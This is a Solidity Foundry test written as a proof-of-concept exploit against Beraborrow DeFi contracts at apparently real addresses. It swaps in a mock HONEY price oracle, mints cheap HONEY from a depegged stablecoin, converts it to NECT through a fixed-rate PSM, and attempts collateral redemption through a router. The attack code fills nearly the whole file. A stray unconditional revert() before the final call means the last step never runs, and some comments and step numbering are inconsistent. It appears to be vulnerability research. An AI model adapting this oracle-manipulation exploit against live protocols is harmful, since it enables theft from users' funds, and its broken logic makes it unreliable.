// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.26;

import {Test, console} from "forge-std/Test.sol";
import {IMetaBeraborrowCore} from "src/interfaces/core/IMetaBeraborrowCore.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IDebtToken} from "src/interfaces/core/IDebtToken.sol";
import {PermissionlessPSM} from "src/core/PermissionlessPSM.sol";
import {ILiquidationManager} from "src/interfaces/core/ILiquidationManager.sol";
import {CollVaultRouter} from "src/periphery/CollVaultRouter.sol";
import {CompoundingInfraredCollateralVault} from "test/deploy/CompoundingInfraredCollateralVault.sol";
import {IDenManager} from "src/interfaces/core/IDenManager.sol";
import {IInfraredCollateralVault} from "src/interfaces/core/vaults/IInfraredCollateralVault.sol";
import {PriceFeed} from "src/core/PriceFeed.sol";
import {ISpotOracle} from "src/interfaces/core/spotOracles/ISpotOracle.sol";
import {IHoneyFactory} from "test/IHoneyFactory.sol";

contract HoneyRedemptionTest is Test {
    // core contract
    IMetaBeraborrowCore public metaBeraborrowCore;
    ILiquidationManager public liquidationManager;
    CollVaultRouter public collVaultRouter;
    address public owner;
    address public nect;
    PermissionlessPSM public psm;
    MockOracle mockHoneyOracle;
    address stable;
    address attacker;
    PriceFeed priceFeed;
    function setUp() public {
        metaBeraborrowCore = IMetaBeraborrowCore(
            0x27393e8a6f8f2e32B870903279999C820E984DC7
        );
        liquidationManager = ILiquidationManager(
            0x965dA3f96dCBfcCF3C1d0603e76356775b5afD2E
        );
        collVaultRouter = CollVaultRouter(
            payable(0x5f1619FfAEfdE17F7e54f850fe90AD5EE44dbf47)
        );
        // nect mint contract
        psm = PermissionlessPSM(0xB2F796FA30A8512C1D27a1853a9a1a8056b5CC25);
        // honey
        stable = 0xFCBD14DC51f0A4d49d5E53C2E0950e0bC26d0Dce;

        // owner
        owner = metaBeraborrowCore.owner();

        //nect
        nect = address(psm.nect());
        attacker = vm.addr(1234);
        priceFeed = PriceFeed(0xa686DC84330b1B3787816de2DaCa485D305c8589);

        mockHoneyOracle = MockOracle(
            address(new MockOracle(1000000000000000000))
        );
    }

    // --- PoC: HONEY price drop leading to cheap NECT, then potential loan repayment exploit ---
    function testPoC_CheapHoneyToNectExploit() public {
        console.log(
            "--- Starting PoC: Cheap HONEY to NECT Exploit Scenario ---"
        );

        // --- 추가: Step 0: HONEY 가격 조작 ---
        console.log("--- Step 0: Manipulating HONEY Price ---");

        // 가격 조작 byusd가 0.9로 디페깅 났다는 가정
        mockHoneyOracle.setPriceInUSD(0, 9);

        // honey factory 조회
        IHoneyFactory honeyFactory = IHoneyFactory(
            0xA4aFef880F5cE1f63c9fb48F661E27F8B4216401
        );
        address honey = stable;
        address byusd = 0x688e72142674041f8f6Af4c808a4045cA1D6aC82;
        address honeyOwner = 0xD13948F99525FB271809F45c268D72a3C00a568D;
        address usdc = 0x549943e04f40284185054145c6E4e9568C1D3241;

        // honey oracle 조작...
        vm.startPrank(honeyOwner);
        honeyFactory.setPriceOracle(address(mockHoneyOracle));
        vm.stopPrank();

        // flash loan 받았다 가정
        deal(byusd, attacker, 10 ** 6 * 100); // 공격자에게 10_000 BYUSD 있다 가정
        deal(usdc, attacker, 10 ** 6 * 100); // 공격자에게 10_000 BYUSD 있다 가정

        uint256 usdcBalance = IERC20(usdc).balanceOf(attacker);
        uint256 byusdBalance = IERC20(byusd).balanceOf(attacker);

        vm.startPrank(attacker);

        // 공격자가 10_000 BYUSD를 사용하여 HONEY를 만든다. Honey depegging 되어있음
        IERC20(usdc).approve(address(honeyFactory), 10 ** 6 * 100);
        IERC20(byusd).approve(address(honeyFactory), 10 ** 6 * 100);
        honeyFactory.mint(byusd, 10 ** 6 * 100, attacker, true);

        uint256 usdcBalanceAfter = IERC20(usdc).balanceOf(attacker);
        uint256 byusdBalanceAfter = IERC20(byusd).balanceOf(attacker);

        vm.stopPrank();
        emit log_named_decimal_uint(
            "use usdc",
            usdcBalance - usdcBalanceAfter,
            6
        );
        emit log_named_decimal_uint(
            "use byusd",
            byusdBalance - byusdBalanceAfter,
            6
        );

        emit log_named_decimal_uint(
            "honey",
            IERC20(stable).balanceOf(attacker),
            18
        );

        uint256 spendtusd = (usdcBalance - usdcBalanceAfter) *
            10 ** 12 +
            ((byusdBalance - byusdBalanceAfter) * 10 ** 12 * 8) /
            10; // byusd 0.8 가격으로 사먹음

        uint256 cheapHoneyAmount = IERC20(stable).balanceOf(attacker); // Attacker "acquires" 100 HONEY (assuming 18 decimals)

        // 오라클 시세 차익으로 허니를 많이 범 여기서 멈출 수 있지만 담보 상환 까지 진행

        emit log_named_decimal_uint("투자한 금액", spendtusd, 18);
        emit log_named_decimal_uint(
            "earn usd",
            cheapHoneyAmount - spendtusd,
            18
        );

        // --- Step 2: Attacker uses cheap HONEY to mint NECT via PermissionlessPSM ---
        // PSM is assumed to mint NECT at a fixed rate (e.g., 1:1) relative to HONEY,
        // regardless of HONEY's crashed external market price.
        vm.startPrank(attacker);

        // Attacker approves PSM to spend their HONEY
        IERC20(stable).approve(address(psm), cheapHoneyAmount);
        emit log_named_decimal_uint("Attacker honey", cheapHoneyAmount, 18);

        uint256 nectBalanceBeforeMint = IERC20(nect).balanceOf(attacker);

        uint16 feeForMint = 5; // 0.05% fee
        psm.deposit(stable, cheapHoneyAmount, attacker, feeForMint);

        uint256 nectMinted = IERC20(nect).balanceOf(attacker) -
            nectBalanceBeforeMint;

        vm.stopPrank();

        assertTrue(nectMinted > 0, "NECT should have been minted by the PSM.");

        emit log_named_decimal_uint("Attackermint nect", nectMinted, 18);
        // --- Step 3: Attacker attempts to use the cheaply acquired NECT with CollVaultRouter.redeemCollateralVault ---
        console.log(
            "--- Step 3: Attempting to use NECT with CollVaultRouter.redeemCollateralVault ---"
        );

        // WBERA를 담보로 하는 Den 타겟으로
        CompoundingInfraredCollateralVault mockCollVault = CompoundingInfraredCollateralVault(
                0x9158d1b0c9Cc4EC7640EAeF0522f710dADeE9a1B
            );
        IDenManager mockDenManager = IDenManager(
            address(0xf1356Cb726C2988C65c5313350C9115D9Af0f954)
        );

        // Assume collIndex 0 is for this mockDenManager.

        CollVaultRouter.RedeemCollateralVaultParams memory params;
        params.collVault = IInfraredCollateralVault(address(mockCollVault));
        params.denManager = IDenManager(address(mockDenManager));
        params.collIndex = 12; // Placeholder index
        params._debtAmount = nectMinted; // Use all cheaply acquired NECT
        params._firstRedemptionHint = address(0); // Placeholder
        params._upperPartialRedemptionHint = address(0); // Placeholder
        params._lowerPartialRedemptionHint = address(0); // Placeholder
        params._partialRedemptionHintNICR = 0; // Placeholder
        params._maxIterations = 2; // Placeholder
        params._maxFeePercentage = 1 ether; // 1% max fee example
        params.unwrap = true; // Attempt to get underlying asset
        params._minSharesWithdrawn = 0; // Don't care for PoC, just want NECT used
        params.minAssetsWithdrawn = 0; // Don't care for PoC
        uint256 nectBalanceBeforeRedeem = IERC20(nect).balanceOf(attacker);

        // The `redeemCollateralVault` function has:
        // `nectar.sendToPeriphery(msg.sender, params._debtAmount);`
        // This means the `attacker` (msg.sender) must have NECT, and it will be transferred.

        vm.startPrank(attacker);
        // The actual CollVaultRouter has checks like `_isWhitelistedCollateralAt`.
        // This call might revert due to those internal checks if mocks aren't perfectly aligned
        // with a (mocked/real) BorrowerOperations state.
        // The goal of PoC: show attacker *tries* to use NECT.
        // If it reverts due to "Incorrect collateral", it means the NECT *would have been sent* if checks passed.

        bool callSucceeded = false;
        bytes memory reason;
        uint256 nectBalanceAfterRedeemAttempt;
        revert();
        try collVaultRouter.redeemCollateralVault(params) {
            callSucceeded = true;
            nectBalanceAfterRedeemAttempt = IERC20(nect).balanceOf(attacker);
        } catch Error(string memory _reason) {
            reason = abi.encodePacked(_reason);
            nectBalanceAfterRedeemAttempt = IERC20(nect).balanceOf(attacker); // NECT might still be transferred if error is late
        } catch Panic(uint256 /*errorCode*/) {
            // Handle Panic if necessary, though Error is more common for reverts
            nectBalanceAfterRedeemAttempt = IERC20(nect).balanceOf(attacker);
        }
        vm.stopPrank();
        address wbera = 0x6969696969696969696969696969696969696969;
        if (callSucceeded) {
            console.log("redeemCollateralVault call succeeded.");
            assertTrue(
                IERC20(nect).balanceOf(attacker) < nectBalanceBeforeRedeem,
                "Attacker's NECT should be consumed by CollVaultRouter"
            );
            emit log_named_decimal_uint(
                "Attacker's NECT balance after: Some NECT was used",
                nectMinted - IERC20(nect).balanceOf(attacker),
                18
            );
            emit log_named_decimal_uint(
                "Attacker's EARNED WBERA balance ",
                IERC20(wbera).balanceOf(attacker),
                18
            );

            // Further assertions: attacker received some collateral assets (params.unwrap = true)
            // This depends heavily on the mockCollVault's redeem logic and Den states.
            // For this PoC, NECT consumption is the primary indicator.
            assertGt(
                IERC20(mockCollVault.asset()).balanceOf(attacker),
                0,
                "Attacker should have received some underlying asset"
            );
        } else {
            console.log(
                "redeemCollateralVault call reverted. Reason (if any): %s",
                string(reason)
            );
            // Even if it reverts due to internal DenManagser logic or hints,
            // the `nectar.sendToPeriphery` happens *before* `denManager.redeemCollateral`.
            // So, if the revert is *after* `sendToPeriphery`, NECT balance should still decrease.
            // However, if the revert is due to initial checks in `redeemCollateralVault` (like `_isWhitelistedCollateralAt`),
            // then `sendToPeriphery` might not be reached.
            // For this PoC, we want to see if NECT was *at least attempted* to be used.
            // A more robust check would be to see if the `collVaultRouter` received the NECT,
            // but `sendToPeriphery`'s exact destination isn't easily determined without tracing its logic.
            // The most straightforward check is the attacker's balance.
            // If the revert happens very early (e.g., at `_isWhitelistedCollateralAt`), the attacker's NECT won't be touched.
            // This PoC is limited by the complexity of setting up valid Den/Vault states for redemption.
            console.log(
                "Attacker's NECT balance after failed attempt: %s",
                nectBalanceAfterRedeemAttempt
            );
        }
    }
}

contract MockOracle is ISpotOracle {
    uint256 public price;
    uint256 public constant PRICE_PRECISION = 1e18; // 가격 정밀도 (18자리로 가정)
    error ZeroAddress();
    error UnavailableData(address asset);
    constructor(uint256 initialPrice) {
        // initialPrice는 이미 18자리 정밀도로 스케일링된 값으로 가정
        price = initialPrice;
    }
    struct Data {
        // Price with WAD precision
        uint256 price;
        // Unix timestamp describing when the price was published
        uint256 publishTime;
    }

    function fetchPrice() external view override returns (uint256) {
        return price;
    }

    function getPriceUnsafe(
        address asset
    ) external view returns (Data memory data) {
        return Data({price: price, publishTime: block.timestamp});
    }

    function priceAvailable(address asset) external view returns (bool) {
        return true;
    }

    function getPriceNoOlderThan(
        address asset,
        uint256 age
    ) external view returns (Data memory data) {
        return Data({price: price, publishTime: block.timestamp});
    }
    // --- Mocking helper functions ---

    function setPrice(uint256 newPrice) external {
        // newPrice는 이미 18자리 정밀도로 스케일링된 값으로 가정
        price = newPrice;
    }

    // 편의 함수: USD 가격을 입력하면 18자리 정밀도로 변환하여 설정
    function setPriceInUSD(
        uint256 usdPricePart,
        uint256 usdDecimalPart
    ) external {
        // 예: setPriceInUSD(0, 1) for $0.1 USD
        // 예: setPriceInUSD(1, 5) for $1.5 USD
        // 예: setPriceInUSD(100, 0) for $100 USD
        uint256 decimalMultiplier = 1;
        uint256 tempDecimalPart = usdDecimalPart;
        uint count = 0;
        if (tempDecimalPart > 0) {
            while (tempDecimalPart > 0) {
                tempDecimalPart /= 10;
                count++;
            }
            decimalMultiplier = 10 ** (18 - count);
        } else {
            decimalMultiplier = PRICE_PRECISION;
        }

        price =
            (usdPricePart * PRICE_PRECISION) +
            (usdDecimalPart * decimalMultiplier);
    }
}
